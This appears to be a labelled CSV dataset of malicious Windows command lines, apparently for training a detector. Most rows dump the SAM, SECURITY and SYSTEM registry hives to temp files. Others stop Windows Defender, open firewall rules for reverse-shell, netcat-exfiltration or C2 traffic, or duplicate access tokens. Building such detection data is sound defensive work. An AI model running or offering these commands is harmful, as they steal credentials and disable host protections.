text,label
"powershell -nop -c ""reg export hklm\security c:\temp\dr7t1ngo.dat""",1
"cmd.exe /c ""reg export hklm\sam c:\temp\lf25v75i.dat""",1
sc   stop   windefend,2
reg export hklm\sam c:\windows\temp\f3nknknn.save,1
reg save hklm\sam c:\windows\temp\y1sum1ha.save,1
reg save hklm\sam c:\windows\temp\q5rnfk1y.save,1
"cmd.exe /c ""rule:   reverse   shell   |   app:   any   |   dir:   outbound   |   act:   allow   |   port:   1337""",2
reg save hklm\system c:\windows\temp\thvgafq5.save,1
reg export hklm\security c:\windows\temp\a1ednspf.save,1
reg export hklm\security c:\windows\temp\fld261hi.save,1
"cmd.exe /c ""reg save hklm\security c:\temp\0cmqx3my.dat""",1
"powershell  -nop  -c  ""reg  save  hklm\security  c:\temp\yr27roa9.dat""",1
reg save hklm\system c:\windows\temp\pfg8dl42.save,1
reg export hklm\system c:\windows\temp\chxpkvsj.save,1
"powershell -nop -c ""reg save hklm\sam c:\temp\bs0vop67.dat""",1
"powershell -nop -c ""reg save hklm\security c:\temp\cgwqoq17.dat""",1
"cmd.exe  /c  ""reg  export  hklm\sam  c:\temp\qvtcevoy.dat""",1
"cmd.exe /c ""reg save hklm\security c:\temp\4ei7nauh.dat""",1
reg save hklm\sam c:\windows\temp\m1xgbooz.save,1
"powershell -nop -c ""reg export hklm\sam c:\temp\anjqpkhl.dat""",1
reg export hklm\system c:\windows\temp\kk1q5rtl.save,1
"powershell   -nop   -c   ""reg   export   hklm\sam   c:\temp\ox00enxz.dat""",1
"cmd.exe /c ""powershell  -nop  -c  ""reg  export  hklm\security  c:\temp\8gbg6e3t.dat""""",1
"powershell -nop -c ""reg save hklm\security c:\temp\usz0byas.dat""",1
reg export hklm\security c:\windows\temp\4bko0l65.save,1
reg export hklm\security c:\windows\temp\x38gtt3z.save,1
"cmd.exe /c ""reg save hklm\sam c:\temp\mucop83j.dat""",1
"cmd.exe /c ""reg export hklm\sam c:\temp\aifchro5.dat""",1
reg export hklm\sam c:\windows\temp\0kty9jtj.save,1
"powershell -nop -c ""reg  save  hklm\sam  c:\windows\temp\keoh3lqa.save""",1
reg save hklm\system c:\windows\temp\3dwa7pn1.save,1
reg save hklm\system c:\windows\temp\bql1916f.save,1
reg export hklm\security c:\windows\temp\771szrjp.save,1
reg save hklm\sam c:\windows\temp\jk5d1ve2.save,1
reg save hklm\security c:\windows\temp\pn2mpgd7.save,1
reg export hklm\security c:\windows\temp\5t8kvjvx.save,1
"powershell -nop -c ""reg save hklm\sam c:\temp\vyrdloeg.dat""",1
reg save hklm\sam c:\windows\temp\rx1gqgmc.save,1
reg  export  hklm\security  c:\windows\temp\mimstzvh.save,1
"cmd.exe /c ""reg save hklm\security c:\temp\vdaejf1w.dat""",1
"powershell -nop -c ""rule: exfil data | app: c:\windows\temp\nc.exe | dir: outbound | act: allow | port: 1337""",2
"cmd.exe /c ""reg export hklm\sam c:\temp\hvs6es90.dat""",1
"cmd.exe /c ""reg export hklm\security c:\temp\c8b4wa4k.dat""",1
"powershell -nop -c ""reg export hklm\security c:\temp\egz7vb1s.dat""",1
reg save hklm\security c:\windows\temp\tvjml8bw.save,1
"[dllimport(""advapi32.dll"")]   extern   bool   duplicatetokenex(...)",3
"cmd.exe /c ""reg save hklm\security c:\temp\hfhlxrpw.dat""",1
"cmd.exe /c ""reg save hklm\sam c:\temp\ofex2dei.dat""",1
reg export hklm\system c:\windows\temp\fkv869wb.save,1
"cmd.exe /c ""reg save hklm\system c:\windows\temp\i7o0w7xg.save""",1
"cmd.exe /c ""rule: c2 beacon | app: c:\users\public\malware.exe | dir: outbound | act: allow | port: 1337""",2
"powershell -nop -c ""reg save hklm\security c:\temp\ban6j2ev.dat""",1
"cmd.exe /c ""reg export hklm\sam c:\temp\rtfofah1.dat""",1
